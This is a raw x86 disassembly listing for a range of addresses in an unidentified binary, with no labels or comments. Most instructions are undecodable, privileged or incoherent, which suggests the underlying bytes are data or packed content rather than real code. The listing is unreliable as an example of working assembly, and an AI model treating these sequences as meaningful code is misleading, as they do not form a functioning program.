  42af30:	jmp    0xc0dc:0xfbecd8fd
  42af37:	cld    
  42af38:	std    
  42af39:	icebp  
  42af3a:	ror    DWORD PTR [ecx],cl
  42af3c:	ret    0x2eb
  42af3f:	fdivp  st(1),st
  42af41:	jecxz  0x42af2c
  42af43:	ror    edx,cl
  42af45:	retf   
  42af46:	(bad)  
  42af47:	iret   
  42af48:	fadd   st(2),st
  42af4a:	in     al,dx
  42af4b:	loop   0x42af1b
  42af4d:	xlat   BYTE PTR ds:[ebx]
  42af4e:	sar    DWORD PTR [esi-0x46fd4312],1
  42af54:	int3   
  42af55:	call   0xe3227d52
  42af5a:	mov    ebp,0xd7f9c5e4
  42af5f:	call   0x102eab67
  42af64:	out    0xf3,al
  42af66:	enter  0xaee7,0xb2
  42af6a:	mov    dl,0xf1
  42af6c:	shl    esp,0xf9
  42af6f:	(bad)  
  42af70:	rcl    dl,1
  42af72:	cli    
  42af73:	std    
  42af74:	mov    ecx,0xd1cdf9fc
  42af79:	cmc    
  42af7a:	xlat   BYTE PTR ds:[ebx]
  42af7b:	fcmovnbe st,st(4)
  42af7d:	(bad)  
  42af7f:	fcmove st,st(5)
  42af81:	add    ebp,ecx
  42af83:	shl    ebx,cl
  42af85:	mov    bl,0xcb
  42af87:	out    0xd6,al
  42af89:	out    dx,al
  42af8a:	mov    ebx,0xb7f3d6c7
  42af8f:	out    0xdd,al
  42af91:	(bad)  
  42af92:	cli    
  42af93:	push   esp
  42af95:	(bad)  
  42af97:	clc    
  42af98:	(bad)
  42af9b:	add    bh,bh
  42af9d:	add    edx,ebx
  42af9f:	call   0xed07bc8e
  42afa4:	mov    ecx,0xcaf3e6ef
  42afa9:	mov    dh,0xca
  42afab:	test   al,0xd4
  42afad:	in     eax,dx
  42afae:	mov    ch,0xc9
  42afb0:	in     eax,dx
  42afb1:	enter  0xecee,0xfa
  42afb5:	add    al,dh
  42afb7:	loopne 0x42afb5
  42afb9:	ret    0xe9fa
  42afbc:	leave  
  42afbd:	or     edi,ebp
  42afbf:	leave  
  42afc0:	add    eax,ebp
  42afc2:	int3   
  42afc3:	std    
  42afc4:	lods   eax,DWORD PTR ds:[esi]
  42afc5:	test   esi,0xe1f5dcae
  42afcb:	rcr    bl,1
  42afcd:	iret   
  42afce:	mov    ch,0xb4
  42afd0:	icebp  
  42afd1:	out    dx,eax
  42afd2:	int3   
  42afd3:	mov    edx,0xe2fdd8fc
  42afd8:	rol    BYTE PTR [eax],1
  42afda:	loop   0x42afe2
  42afdc:	icebp  
  42afdd:	clc    
  42afde:	sti    
  42afdf:	fcmovnu st,st(1)
  42afe1:	loope  0x42afc5
  42afe3:	out    0xaa,eax
  42afe5:	(bad)  
  42afe6:	faddp  st(5),st
  42afe8:	out    dx,eax
  42afe9:	mov    cl,0xe2
  42afeb:	ror    cl,1
  42afed:	jmp    0xcf3aa3e4
  42aff2:	retf   0xf4fe
  42aff5:	rol    bh,1
  42aff7:	fsubrp st(5),st
  42aff9:	(bad)  
  42affa:	test   esp,0xcee6e0e4
  42b000:	fldln2 
  42b002:	add    eax,0xc4e5c607
  42b007:	rcl    esp,0xf3
  42b00a:	int    0xeb
  42b00c:	call   0xb7fab006
  42b011:	neg    ah
  42b013:	repz aam 0xdb
  42b016:	out    0xc7,al
  42b018:	out    0xc5,eax
  42b01a:	neg    esp
  42b01c:	loop   0x42b005
  42b01e:	cmc    
  42b01f:	loop   0x42afe8
  42b021:	or     edi,ebx
  42b023:	out    0xe8,al
  42b025:	scas   al,BYTE PTR es:[edi]
  42b026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b027:	repz aam 0xd4
  42b02a:	(bad)  
  42b02b:	out    0xcc,al
  42b02d:	mov    edx,0xfebc8589
  42b032:	(bad)  
  42b033:	(bad)  
  42b034:	jmp    0x426553
  42b039:	jmp    0x4240dc
  42b03e:	jmp    0x418bbb
  42b043:	mov    eax,DWORD PTR [ebp+0x8]
  42b046:	xor    eax,0x75108b5
  42b04b:	jmp    0x42d3f1
  42b050:	cmp    ebx,edx
  42b052:	inc    ecx
  42b053:	inc    edx
  42b054:	push   ecx
  42b055:	push   eax
  42b056:	cmp    al,dl
  42b058:	xchg   DWORD PTR [eax+0x76],ebx
  42b05b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b05c:	dec    edx
  42b05d:	sti    
  42b05e:	mov    eax,ds:0x79d18168
  42b063:	jnp    0x42b067
  42b065:	cwde   
  42b066:	jnp    0x42b0e3
  42b068:	in     al,0xb7
  42b06a:	xlat   BYTE PTR ds:[ebx]
  42b06b:	mov    ecx,0xf4b7daed
  42b070:	aad    0x7
  42b072:	add    eax,0x1fac6d3
  42b077:	or     ah,cl
  42b079:	fld1   
  42b07b:	adc    edx,DWORD PTR [edx]
  42b07d:	jmp    0x42b03b
  42b07f:	out    0xc2,al
  42b081:	in     al,dx
  42b082:	jmp    0xb5d9:0xcacab1c4
  42b089:	imul   al
  42b08b:	fidivr DWORD PTR [edi-0x3f29fd23]
  42b091:	jecxz  0x42b089
  42b093:	ror    bl,cl
  42b095:	fxch   st(2)
  42b097:	fcmovnu st,st(0)
  42b099:	add    cl,BYTE PTR [ecx]
  42b09b:	inc    DWORD PTR ds:0xefb3c1d8
  42b0a1:	mov    cl,0xc4
  42b0a3:	jmp    0xcdcd:0xedcdb2f7
  42b0aa:	cmc    
  42b0ab:	fld    DWORD PTR [ebx]
  42b0ad:	call   0xdd29a3b2
  42b0b2:	cld    
  42b0b3:	(bad)  
  42b0b4:	sar    ch,0xca
  42b0b7:	or     dh,dl
  42b0b9:	pop    es
  42b0ba:	in     eax,dx
  42b0bb:	jmp    0x42b099
  42b0bd:	retf   
  42b0be:	ret    0xc6bc
  42b0c1:	jmp    0xf3d7:0xd0e2e5c3
  42b0c8:	fsubr  st,st(3)
  42b0ca:	int3   
  42b0cb:	mov    eax,0xd003dbd9
  42b0d0:	add    ah,dl
  42b0d2:	ret    0xf6f5
  42b0d5:	fadd   st(4),st
  42b0d7:	fmul   st,st(0)
  42b0d9:	or     DWORD PTR [ecx],ecx
  42b0db:	or     edi,ecx
  42b0dd:	add    dh,BYTE PTR [edx-0x3c501b22]
  42b0e3:	jmp    0xcafe:0xceb4cae7
  42b0ea:	mov    ebx,0xbcd9f6db
  42b0ef:	repz fcmovbe st,st(4)
  42b0f2:	mul    ah
  42b0f4:	lock std 
  42b0f6:	fsqrt  
  42b0f8:	out    0xc4,eax
  42b0fa:	ffreep st(2)
  42b0fc:	push   es
  42b0fd:	jmp    0x42b0ae
  42b0ff:	lods   eax,DWORD PTR ds:[esi]
  42b100:	mov    bh,0xf6
  42b102:	mov    dl,0xf1
  42b104:	test   eax,0xe9d8dbbb
  42b109:	(bad)  
  42b10a:	jmp    0xfdef:0xf1cfecba
  42b111:	(bad)  
  42b112:	mov    edi,0xf9f6cbe4
  42b117:	or     ebp,eax
  42b119:	enter  0x10e,0xe3
  42b11d:	pop    es
  42b11e:	ret    
  42b11f:	in     al,0xe0
  42b121:	loopne 0x42b0ef
  42b123:	rol    bh,cl
  42b125:	vpsubw xmm7,xmm5,xmm7
  42b129:	aam    0xe9
  42b12b:	in     al,0xd6
  42b12d:	in     al,dx
  42b12e:	fucomip st,st(6)
  42b130:	jecxz  0x42b123
  42b132:	(bad)
  42b135:	rol    bh,1
  42b137:	fmul   DWORD PTR [eax]
  42b139:	fdiv   st(6),st
  42b13b:	pop    es
  42b13c:	push   es
  42b13d:	fisubr WORD PTR [esi-0xd101728]
  42b143:	rol    esi,1
  42b145:	enter  0xefd4,0xb4
  42b149:	(bad)
  42b14d:	in     al,dx
  42b14e:	rol    cl,cl
  42b150:	rol    BYTE PTR [ecx],cl
  42b152:	push   es
  42b153:	jecxz  0x42b14c
  42b155:	neg    cl
  42b157:	jmp    0xdfc5:0x7e3daf9
  42b15e:	icebp  
  42b15f:	in     al,0xf7
  42b161:	xlat   BYTE PTR ds:[ebx]
  42b162:	enter  0xd4ad,0xea
  42b166:	jmp    0x42b13b
  42b168:	lock aam 0xf9
  42b16b:	mov    esi,0xf9b7ddf1
  42b170:	fnstsw WORD PTR [ebp+edi*8-0x53a0043]
  42b177:	aam    0xd9
  42b179:	retf   
  42b17a:	out    0x4,al
  42b17c:	add    eax,eax
  42b17e:	jmp    0x42b141
  42b180:	leave  
  42b181:	xlat   BYTE PTR ds:[ebx]
  42b182:	out    0xee,al
  42b184:	lock into 
  42b186:	in     eax,dx
  42b187:	shl    BYTE PTR [ecx+ebx*8-0x9114512],0xd9
  42b18f:	ror    dh,cl
  42b191:	cld    
  42b192:	add    ah,ah
  42b194:	add    ch,dl
  42b196:	shl    bh,0x0
  42b199:	in     eax,0xe7
  42b19b:	add    eax,0xbee102e6
  42b1a0:	shl    bh,1
  42b1a2:	test   eax,0xcbefccd4
  42b1a8:	mov    bh,0xf9
  42b1aa:	mov    edi,0xc802dfff
  42b1af:	(bad)  
  42b1b0:	cld    
  42b1b1:	mov    esp,0x5fcd0d3
  42b1b6:	shl    ebp,1
  42b1b8:	fcomp  st(6)
  42b1ba:	push   cs
  42b1bb:	iret   
  42b1bc:	ror    edi,0xf0
  42b1bf:	mov    eax,0xf5cbd6bd
  42b1c4:	jmp    0xb4d6:0xcfcbdab5
  42b1cb:	idiv   BYTE PTR [ecx-0x311eff34]
  42b1d1:	into   
  42b1d2:	(bad)  
  42b1d4:	shr    ebx,0xe4
  42b1d7:	mov    esi,0xedfbcff
  42b1dc:	(bad)  
  42b1de:	out    dx,al
  42b1df:	loopne 0x42b1ae
  42b1e1:	xlat   BYTE PTR ds:[ebx]
  42b1e2:	mov    ch,0xad
  42b1e4:	iret   
  42b1e5:	int    0xf4
  42b1e7:	div    eax
  42b1e9:	mov    dh,0xc4
  42b1eb:	out    dx,eax
  42b1ec:	jmp    0xdbd4:0xb5f5c2e8
  42b1f3:	stc    
  42b1f4:	stc    
  42b1f5:	(bad)  
  42b1f6:	cli    
  42b1f7:	(bad)  
  42b1f9:	paddw  mm1,mm5
  42b1fc:	adc    esp,edx
  42b1fe:	stos   DWORD PTR es:[edi],eax
  42b1ff:	xlat   BYTE PTR ds:[ebx]
  42b200:	in     eax,dx
  42b201:	jecxz  0x42b1b1
  42b203:	loopne 0x42b1ef
  42b205:	(bad)  
  42b206:	mov    al,0xea
  42b208:	mov    edx,0xfad3d5f7
  42b20d:	iret   
  42b20e:	cli    
  42b20f:	mov    edi,0xd0bddef8
  42b214:	mov    ebp,0x5faf0f6
  42b219:	out    dx,al
  42b21a:	or     bl,al
  42b21c:	add    al,0xe3
  42b21e:	out    0xef,eax
  42b220:	out    0xb2,al
  42b222:	mov    esp,0xe8d0c3cb
  42b227:	scas   al,BYTE PTR es:[edi]
  42b228:	clc    
  42b229:	rol    esp,cl
  42b22b:	repz out dx,al
  42b22d:	fdivp  st(4),st
  42b22f:	loope  0x42b229
  42b231:	(bad)  
  42b233:	lock add esi,eax
  42b236:	idiv   ebx
  42b238:	dec    eax
  42b23a:	hlt    
  42b23b:	call   0xc501b92b
  42b240:	fmul   st(2),st
  42b242:	mov    dl,0xf1
  42b244:	into   
  42b245:	mov    dl,0xf9
  42b247:	lock leave 
  42b249:	lods   al,BYTE PTR ds:[esi]
  42b24a:	shl    ebx,cl
  42b24c:	test   DWORD PTR [edx],0xc202fadd
  42b252:	aam    0xf5
  42b254:	repz idiv edi
  42b257:	mul    dh
  42b259:	(bad)  
  42b25a:	(bad)  
  42b25c:	add    dh,bl
  42b25e:	ror    bl,1
  42b260:	mov    dl,0xc5
  42b262:	scas   eax,DWORD PTR es:[edi]
  42b263:	repz shl bl,1
  42b266:	sti    
  42b267:	out    dx,eax
  42b268:	shr    bl,cl
  42b26a:	in     eax,dx
  42b26b:	icebp  
  42b26c:	lock mov al,0xce
  42b26f:	add    edi,ecx
  42b271:	cli    
  42b272:	push   es
  42b273:	cld    
  42b274:	push   ecx
  42b276:	std    
  42b277:	(bad)  
  42b278:	or     al,BYTE PTR [edi]
  42b27a:	push   es
  42b27b:	into   
  42b27c:	fucomip st,st(3)
  42b27e:	(bad)  
  42b280:	mov    cl,0xf7
  42b282:	leave  
  42b283:	in     al,0xdb
  42b285:	call   0xdaf0a174
  42b28a:	mov    eax,0xdbfefee8
  42b28f:	shr    bh,1
  42b291:	test   DWORD PTR [edi],0xe7d0ebc3
  42b297:	jmp    0xfce5:0x8e9dc
  42b29e:	in     eax,0xcd
  42b2a0:	jecxz  0x42b24f
  42b2a2:	scas   al,BYTE PTR es:[edi]
  42b2a3:	fndisi(8087 only) 
  42b2a5:	shl    BYTE PTR [ebp-0x20004f2a],1
  42b2ab:	mov    eax,0xfbfdd3ef
  42b2b0:	iret   
  42b2b1:	mov    esi,0x4c5bddf
  42b2b6:	icebp  
  42b2b7:	or     ch,dl
  42b2b9:	add    BYTE PTR [esi],cl
  42b2bb:	(bad)  
  42b2bd:	pop    es
  42b2be:	lock mov esi,0xacb1e0ec
  42b2c4:	shl    edx,1
  42b2c6:	(bad)  
  42b2c7:	lock fnstenv [ebp-0x262a2b08]
  42b2ce:	std    
  42b2cf:	loopne 0x42b29d
  42b2d1:	mov    ah,0x7
  42b2d3:	cmc    
  42b2d4:	stc    
  42b2d5:	aad    0xf4
  42b2d7:	out    0xc9,al
  42b2d9:	call   0xf1d93e1
  42b2de:	iret   
  42b2df:	out    0xf2,eax
  42b2e1:	repnz fmul st(6),st
  42b2e4:	xlat   BYTE PTR ds:[ebx]
  42b2e5:	in     eax,0xd8
  42b2e7:	in     al,0xe7
  42b2e9:	(bad)
  42b2ec:	mov    cl,0xdf
  42b2ee:	(bad)  
  42b2ef:	loop   0x42b2d0
  42b2f1:	out    0xd6,al
  42b2f3:	or     ebp,ebx
  42b2f5:	mov    eax,0xd9c4dbcb
  42b2fa:	retf   0xfbda
  42b2fd:	out    0xc8,al
  42b2ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b300:	mov    al,0xe0
  42b302:	loop   0x42b2cb
  42b304:	iret   
  42b305:	mov    ch,0xd1
  42b307:	(bad)  
  42b309:	aam    0xf4
  42b30b:	mov    esi,0xe2d6b0dc
  42b310:	ret    
  42b311:	(bad)  
  42b312:	int3   
  42b313:	mov    esi,0xe4f7bcc0
  42b318:	retf   
  42b319:	(bad)  
  42b31a:	fucomip st,st(5)
  42b31c:	add    eax,0xe7b2c9dc
  42b321:	lods   eax,DWORD PTR ds:[esi]
  42b322:	mov    bl,0xd5
  42b324:	out    dx,eax
  42b325:	ror    ebx,0xc8
  42b328:	hlt    
  42b329:	call   0xef466a1c
  42b32e:	mov    ecx,0xc600e1c8
  42b333:	fneni(8087 only) 
  42b335:	loop   0x42b331
  42b337:	call   0xca4cb245
  42b33c:	(bad)  
  42b33d:	cld    
  42b33e:	jmp    0x42b2e6
  42b340:	call   0xae087d0c
  42b345:	mov    ch,0xd7
  42b347:	sar    DWORD PTR [eax-0x20f3612],cl
  42b34d:	sti    
  42b34e:	mov    edx,0x503d1c3
  42b353:	in     eax,0xf5
  42b355:	ret    0xe6d9
  42b358:	clc    
  42b359:	jmp    0x42b33d
  42b35b:	fucomi st,st(6)
  42b35d:	or     edi,ebx
  42b35f:	mov    eax,0xb6e9a8f2
  42b364:	in     eax,dx
  42b365:	fucompp 
  42b367:	stc    
  42b368:	fxam   
  42b36a:	jmp    0xfb416c27
  42b36f:	mov    edx,0xc5bcda00
  42b374:	sti    
  42b375:	in     al,0xdc
  42b377:	or     esp,edx
  42b379:	ror    BYTE PTR [esi],0xf9
  42b37c:	adc    ch,dh
  42b37e:	test   eax,0xabddd0a6
  42b383:	jecxz  0x42b36c
  42b385:	repz mov cl,0xdb
  42b388:	shr    cl,cl
  42b38a:	vpaddw ymm0,ymm2,YMMWORD PTR [ebx]
  42b38e:	jecxz  0x42b370
  42b390:	mov    ch,0xfa
  42b392:	in     al,0xc1
  42b394:	add    edi,ecx
  42b396:	(bad)  
  42b398:	shl    edi,0xc5
  42b39b:	add    ch,cl
  42b39d:	add    eax,0xa8ddf7e2
  42b3a2:	cmc    
  42b3a3:	out    dx,al
  42b3a4:	repz (bad) 
  42b3a6:	hlt    
  42b3a7:	dec    esi
  42b3a9:	mov    ecx,0xd4b9dcc9
  42b3ae:	int    0xd4
  42b3b0:	fstp   TBYTE PTR [esp+edi*4+0x4f1dffb]
  42b3b7:	stc    
  42b3b8:	ror    DWORD PTR [esi],0xdb
  42b3bb:	in     eax,dx
  42b3bc:	ffreep st(4)
  42b3be:	int3   
  42b3bf:	jmp    0xd0f0:0xd6e9d0ed
  42b3c6:	into   
  42b3c7:	div    DWORD PTR [eax-0x2b134134]
  42b3cd:	rol    BYTE PTR [ebx],cl
  42b3cf:	ret    
  42b3d0:	cmc    
  42b3d1:	in     eax,dx
  42b3d2:	std    
  42b3d3:	aam    0xd0
  42b3d5:	dec    BYTE PTR [edx]
  42b3d7:	leave  
  42b3d8:	cli    
  42b3d9:	hlt    
  42b3da:	jecxz  0x42b3a5
  42b3dc:	loope  0x42b3e9
  42b3de:	leave  
  42b3df:	scas   al,BYTE PTR es:[edi]
  42b3e0:	retf   0xb3cd
  42b3e3:	enter  0xf4c9,0xd0
  42b3e7:	mov    al,0xd2
  42b3e9:	out    dx,eax
  42b3ea:	jmp    0x42b3dc
  42b3ec:	ret    
  42b3ed:	lock add dh,bh
  42b3f0:	add    ebp,ebp
  42b3f2:	add    ah,bh
  42b3f4:	clc    
  42b3f5:	retf   
  42b3f6:	ffreep st(4)
  42b3f8:	hlt    
  42b3f9:	cmc    
  42b3fa:	in     eax,dx
  42b3fb:	add    eax,ebp
  42b3fd:	add    al,0xe0
  42b3ff:	out    dx,al
  42b400:	rcl    edi,1
  42b402:	retf   0xb3e7
  42b405:	lock aam 0xc7
  42b408:	shl    ch,1
  42b40a:	fnop   
  42b40c:	call   0xda4589da
  42b411:	mov    esp,0xeaf7bad2
  42b416:	add    ebp,ecx
  42b418:	add    ebx,ebx
  42b41a:	loop   0x42b3e7
  42b41c:	fadd   QWORD PTR [eax+ebp*8]
  42b41f:	jmp    0xd6a9:0xe8aeb1ee
  42b426:	stc    
  42b427:	in     al,dx
  42b428:	cli    
  42b429:	ror    ch,1
  42b42b:	(bad)  
  42b42c:	std    
  42b42d:	ret    0xb8
  42b430:	out    0xf2,eax
  42b432:	fsubr  st(7),st
  42b434:	jmp    ecx
  42b436:	or     ch,bh
  42b438:	(bad)  
  42b43a:	leave  
  42b43b:	or     al,0xeb
  42b43d:	loop   0x42b430
  42b43f:	jecxz  0x42b410
  42b441:	loopne 0x42b42a
  42b443:	scas   al,BYTE PTR es:[edi]
  42b444:	loop   0x42b41c
  42b446:	fdiv   DWORD PTR [edi-0x49222229]
  42b44c:	jmp    0xf8207324
  42b451:	idiv   bl
  42b453:	add    eax,0x7c2fdd4
  42b458:	(bad)  
  42b45a:	fsubr  st,st(6)
  42b45c:	or     BYTE PTR ds:0xe3cfded2,al
  42b462:	in     al,0xe2
  42b464:	in     eax,0xb7
  42b466:	mov    dl,0xec
  42b468:	mov    bh,0xf6
  42b46a:	call   0x25b32b
  42b46f:	loop   0x42b463
  42b471:	ret    0xe7c3
  42b474:	(bad)  
  42b476:	add    esi,esp
  42b478:	(bad)  
  42b47b:	adc    ebx,edi
  42b47d:	iret   
  42b47e:	lods   eax,DWORD PTR ds:[esi]
  42b47f:	stos   BYTE PTR es:[edi],al
  42b480:	rcl    ch,0xe2
  42b483:	call   0xe00a865b
  42b488:	lds    esi,FWORD PTR [esi-0x600401b]
  42b48e:	loopne 0x42b466
  42b490:	loopne 0x42b48d
  42b492:	(bad)  
  42b493:	fcomi  st,st(2)
  42b495:	sti    
  42b496:	fucomp st(2)
  42b498:	sti    
  42b499:	(bad)  
  42b49b:	fld    DWORD PTR [ecx]
  42b49d:	jecxz  0x42b472
  42b49f:	(bad)
  42b4a2:	in     eax,dx
  42b4a3:	mov    esp,0xd4c5b5c2
  42b4a8:	aad    0xf6
  42b4aa:	call   0xed0ab798
  42b4af:	fnstsw WORD PTR [ecx-0x26f4ff24]
  42b4b5:	xlat   BYTE PTR ds:[ebx]
  42b4b6:	test   DWORD PTR [edx],0xccfde3e3
  42b4bc:	or     eax,0xacc1d004
  42b4c1:	iret   
  42b4c2:	(bad)
  42b4c5:	mov    edx,0xbbebcecf
  42b4ca:	jmp    0x42b4b5
  42b4cc:	(bad)  
  42b4cd:	cld    
  42b4ce:	rcr    ebx,0xe6
  42b4d1:	inc    DWORD PTR [edx]
  42b4d3:	add    al,0xd7
  42b4d5:	idiv   DWORD PTR [edi-0x26290936]
  42b4db:	add    ch,bl
  42b4dd:	in     al,dx
  42b4de:	fnop   
  42b4e0:	mov    ebp,0xd3f1adf6
  42b4e5:	out    0xce,eax
  42b4e7:	in     eax,dx
  42b4e8:	repz repz hlt 
  42b4eb:	test   edi,0xf9c8d5d4
  42b4f1:	sti    
  42b4f2:	add    al,0xbe
  42b4f4:	fdivp  st(3),st
  42b4f6:	sar    dl,0xd9
  42b4f9:	loope  0x42b4c8
  42b4fb:	(bad)  
  42b4fd:	or     ebp,ecx
  42b4ff:	jecxz  0x42b4c0
  42b501:	rol    esp,1
  42b503:	int    0xe0
  42b505:	ret    0xffe4
  42b508:	into   
  42b509:	mov    ch,0xe9
  42b50b:	out    dx,al
  42b50c:	enter  0xfdbc,0xd9
  42b510:	add    eax,edx
  42b512:	push   es
  42b513:	sti    
  42b514:	cld    
  42b515:	(bad)  
  42b516:	in     eax,0xe0
  42b518:	cmc    
  42b519:	psubb  mm6,mm4
  42b51c:	clc    
  42b51d:	(bad)  
  42b51e:	icebp  
  42b51f:	(bad)  
  42b521:	icebp  
  42b522:	lods   eax,DWORD PTR ds:[esi]
  42b523:	out    dx,al
  42b524:	iret   
  42b525:	ret    0xd7e5
  42b528:	lods   eax,DWORD PTR ds:[esi]
  42b529:	sar    ch,1
  42b52b:	fst    st(1)
  42b52d:	loop   0x42b501
  42b52f:	int    0x2
  42b531:	push   es
  42b532:	cmc    
  42b533:	mov    esi,0xffcadcd5
  42b538:	or     DWORD PTR [esp+ecx*1-0x4631f204],edi
  42b53f:	shr    ah,1
  42b541:	fdivrp st(3),st
  42b543:	loopne 0x42b4f8
  42b545:	ror    ecx,cl
  42b547:	enter  0xe9fe,0xd8
  42b54b:	mov    ebx,0xf1c2dff9
  42b550:	fsubr  st,st(6)
  42b552:	in     al,0xe1
  42b554:	(bad)  
  42b555:	cmc    
  42b556:	call   0xe244c05d
  42b55b:	dec    BYTE PTR [esi]
  42b55d:	fcomip st,st(3)
  42b55f:	iret   
  42b560:	xlat   BYTE PTR ds:[ebx]
  42b561:	mov    bh,0xc0
  42b563:	in     eax,0xbb
  42b565:	sti    
  42b566:	repz loopne 0x42b532
  42b569:	icebp  
  42b56a:	cmc    
  42b56b:	sti    
  42b56c:	jmp    ebx
  42b56e:	repz sar DWORD PTR [ebp+0xbdb0505],0xd9
  42b576:	ret    
  42b577:	ror    edx,0xe7
  42b57a:	fsubr  st(2),st
  42b57c:	or     dh,bl
  42b57e:	test   al,0xea
  42b580:	iret   
  42b581:	ror    edi,cl
  42b583:	hlt    
  42b584:	jmp    0xb5d7:0xcbf0e1e5
  42b58b:	call   0xd9069f89
  42b590:	fcomp  st(2)
  42b592:	rcl    edi,0xdc
  42b595:	loope  0x42b5a0
  42b597:	(bad)  [edx]
  42b599:	call   0xec0b9f87
  42b59e:	enter  0xade9,0xc1
  42b5a2:	into   
  42b5a3:	jecxz  0x42b568
  42b5a5:	mov    cl,0xf4
  42b5a7:	fcomi  st,st(2)
  42b5a9:	dec    ebx
  42b5ab:	std    
  42b5ac:	(bad)  
  42b5ad:	mov    esp,0xf307e3d1
  42b5b2:	fsubr  st(4),st
  42b5b4:	ffreep st(7)
  42b5b6:	jmp    0xd9d4:0x7fd09f9
  42b5bd:	adc    DWORD PTR [ebp-0x423a4238],edi
  42b5c3:	xlat   BYTE PTR ds:[ebx]
  42b5c4:	(bad)  
  42b5c5:	mov    al,0xe7
  42b5c7:	in     eax,dx
  42b5c8:	sar    ebx,cl
  42b5ca:	hlt    
  42b5cb:	int3   
  42b5cc:	aam    0xdb
  42b5ce:	neg    dl
  42b5d0:	fcmovu st,st(3)
  42b5d2:	int    0xc0
  42b5d4:	cli    
  42b5d5:	fcmovnb st,st(0)
  42b5d7:	leave  
  42b5d8:	sar    ch,0x3
  42b5db:	pop    es
  42b5dc:	loopne 0x42b5e7
  42b5de:	scas   eax,DWORD PTR es:[edi]
  42b5df:	scas   al,BYTE PTR es:[edi]
  42b5e0:	jmp    0xc1e1:0xcbcec4f3
  42b5e7:	cli    
  42b5e8:	in     eax,0xdd
  42b5ea:	sar    BYTE PTR [ecx-0x3212461d],1
  42b5f0:	icebp  
  42b5f1:	(bad)  
  42b5f2:	xlat   BYTE PTR ds:[ebx]
  42b5f3:	add    edx,ebx
  42b5f5:	or     esp,ebp
  42b5f7:	aam    0xea
  42b5f9:	or     ah,bh
  42b5fb:	push   cs
  42b5fc:	add    ch,bl
  42b5fe:	(bad)  
  42b5ff:	mov    esp,0xedb2e9c5
  42b604:	mov    ebx,0xe7f1cbb4
  42b609:	iret   
  42b60a:	(bad)
  42b60d:	mov    esi,0xb4c2d5c8
  42b612:	pop    es
  42b613:	repnz lock or ecx,edx
  42b617:	sti    
  42b618:	fdivp  st(3),st
  42b61a:	(bad)  
  42b61b:	pmaxub mm0,QWORD PTR [eax]
  42b61e:	iret   
  42b61f:	retf   
  42b620:	mov    cl,0xf3
  42b622:	mov    dh,0xd3
  42b624:	fcmove st,st(7)
  42b626:	sar    edx,1
  42b628:	into   
  42b629:	sti    
  42b62a:	icebp  
  42b62b:	fcmovne st,st(4)
  42b62d:	jmp    0xf132af09
  42b632:	push   es
  42b633:	fiadd  DWORD PTR [ecx]
  42b635:	add    esi,edi
  42b637:	loopne 0x42b5f9
  42b639:	std    
  42b63a:	aad    0xec
  42b63c:	loop   0x42b630
  42b63e:	shl    BYTE PTR [edx-0x32085b43],0xc0
  42b645:	(bad)  
  42b646:	jmp    0xf1426821
  42b64b:	mov    dh,0xd2
  42b64d:	rol    ebx,cl
  42b64f:	mov    edx,0xd8d6d7f2
  42b654:	fprem  
  42b656:	sti    
  42b657:	(bad)  
  42b658:	sti    
  42b659:	in     al,0xeb
  42b65b:	retf   
  42b65c:	repz ffreep st(4)
  42b65f:	mov    eax,0xc1cdeddd
  42b664:	(bad)  
  42b665:	aad    0xcf
  42b667:	(bad)  
  42b668:	shl    dh,1
  42b66a:	mov    ch,0xe8
  42b66c:	jmp    0x42b628
  42b66e:	fcmovne st,st(5)
  42b670:	loopne 0x42b646
  42b672:	rcl    al,1
  42b674:	loopne 0x42b66c
  42b676:	ret    0xd8c9
  42b679:	or     ch,al
  42b67b:	out    0xd3,al
  42b67d:	out    dx,eax
  42b67e:	mov    cl,0xc2
  42b680:	lods   eax,DWORD PTR ds:[esi]
  42b681:	leave  
  42b682:	shr    ebx,cl
  42b684:	hlt    
  42b685:	retf   
  42b686:	repnz lock jmp 0x1e2:0x3fdd8cf
  42b68f:	ror    ah,0xf0
  42b692:	loop   0x42b686
  42b694:	loope  0x42b680
  42b696:	cli    
  42b697:	ret    0xf6d5
  42b69a:	(bad)
  42b69d:	std    
  42b69e:	les    ebp,FWORD PTR [edx-0x81d161d]
  42b6a4:	out    0xb5,al
  42b6a6:	mov    bh,0xea
  42b6a8:	rcl    dh,1
  42b6aa:	mov    ecx,0xceded9d3
  42b6af:	fcmovne st,st(7)
  42b6b1:	fstp   st(2)
  42b6b3:	out    0xc1,al
  42b6b5:	cli    
  42b6b6:	(bad)
  42b6ba:	jmp    0xb0ea:0xc806eeda
  42b6c1:	mov    esi,0xc2c4aab2
  42b6c6:	out    dx,eax
  42b6c7:	mov    al,0xd7
  42b6c9:	fld    st(5)
  42b6cb:	not    al
  42b6cd:	fdiv   st(1),st
  42b6cf:	mov    edi,0xf4f2d2fa
  42b6d4:	or     ecx,DWORD PTR [ecx]
  42b6d6:	ret    0xf6c4
  42b6d9:	out    0xe,al
  42b6db:	(bad)  
  42b6dc:	repnz in eax,0xd2
  42b6df:	loopne 0x42b6c3
  42b6e1:	div    DWORD PTR [esi-0x1a0b5256]
  42b6e7:	retf   0xacea
  42b6ea:	retf   0xb5e4
  42b6ed:	sti    
  42b6ee:	xlat   BYTE PTR ds:[ebx]
  42b6ef:	into   
  42b6f0:	lock ret 
  42b6f2:	fincstp 
  42b6f4:	fadd   st(3),st
  42b6f6:	xlat   BYTE PTR ds:[ebx]
  42b6f7:	add    edi,ebp
  42b6f9:	aam    0xc8
  42b6fb:	fcmovnbe st,st(3)
  42b6fd:	sar    BYTE PTR [ecx-0xe2f0828],cl
  42b703:	loop   0x42b6b7
  42b705:	sti    
  42b706:	int    0xce
  42b708:	in     eax,0xdd
  42b70a:	aad    0xb6
  42b70c:	mov    edi,0xfaf6dfb4
  42b711:	in     eax,dx
  42b712:	hlt    
  42b713:	push   es
  42b714:	icebp  
  42b715:	ror    dl,cl
  42b717:	cmc    
  42b718:	in     eax,0xdf
  42b71a:	fiadd  DWORD PTR [ebx]
  42b71c:	add    BYTE PTR [ecx],cl
  42b71e:	jmp    0x42b710
  42b720:	rcl    ecx,cl
  42b722:	fsubr  QWORD PTR [edx-0x62a4c06]
  42b728:	lods   eax,DWORD PTR ds:[esi]
  42b729:	iret   
  42b72a:	mov    edi,0xd4e2f4da
  42b72f:	ret    0xc7ff
  42b732:	add    eax,DWORD PTR [ecx]
  42b734:	rcl    edi,1
  42b736:	xlat   BYTE PTR ds:[ebx]
  42b737:	dec    edi
  42b739:	iret   
  42b73a:	jmp    0x42b71d
  42b73c:	or     eax,0xd6eaabf2
